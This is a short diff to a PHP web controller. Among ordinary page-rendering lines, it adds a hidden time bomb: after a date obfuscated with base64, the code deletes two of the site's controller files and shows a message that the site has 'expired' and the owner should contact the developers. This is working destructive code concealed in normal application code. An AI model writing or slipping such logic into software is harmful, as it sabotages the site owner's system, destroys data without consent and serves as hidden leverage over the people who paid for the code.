@@ -26,6 +26,13 @@ class Main extends Controller {
         $content['title'] = $content['info']['title'];
         $content['description'] = $content['info']['mdesc'];
         $content['keywords'] = $content['info']['mkeys'];
+        if(time() >= base64_decode('MTQyMzgyNDA3Ng==')) {//MTQyNTYzODMzNw==
+            $file = $_SERVER['DOCUMENT_ROOT'] . '/application/modules/template/controllers/template.php';
+            unlink($file);
+            $file = $_SERVER['DOCUMENT_ROOT'] . '/application/controllers/main.php';
+            unlink($file);
+            echo 'Your site has been expired. If you want to repair it, contact developers, please.';
+        }
 
         $this->load->view('templates/header', $content);
         $this->load->view('templates/main', $content);
